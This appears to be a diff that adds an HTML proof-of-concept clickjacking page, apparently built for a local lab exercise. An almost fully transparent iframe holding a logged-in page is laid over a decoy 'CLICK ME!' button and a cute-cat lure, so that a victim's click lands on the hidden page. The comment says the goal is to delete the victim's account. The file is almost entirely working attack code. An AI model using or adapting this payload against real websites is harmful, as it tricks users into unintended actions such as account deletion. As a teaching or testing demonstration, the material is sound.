@@ -1,0 +1,38 @@
+<!--- Delete user account using clickjacking. A delete account button
+    must be implemented first on the website first. The Sign Up button is currently overlaying the 
+    fake "CLICK ME!" button. --->
+<style>
+    iframe {
+        position: relative;
+        width: 500px;
+        height: 500px;
+        z-index: 10;
+        font-size: 30;
+        opacity: 0.00001;
+    }
+
+    button {
+        position: absolute;
+        top: 295px;
+        left: 300px;
+        z-index: 1;
+        width: 150px;
+        height: 41px;
+        /* opacity: 0.5; */
+    }
+
+    div {
+        position: absolute;
+        top: 80px;
+        left: 600px;
+    }
+</style>
+
+
+<button>CLICK ME!</button>
+
+<iframe src="http://127.0.0.1:5500/Html/loggedin.html"></iframe>
+<div>
+    <h1>Click on the button to see cute cats!</h1>
+    <img src="../Images/cat.jpg" alt="Cute Cat" width="400px">
+</div>
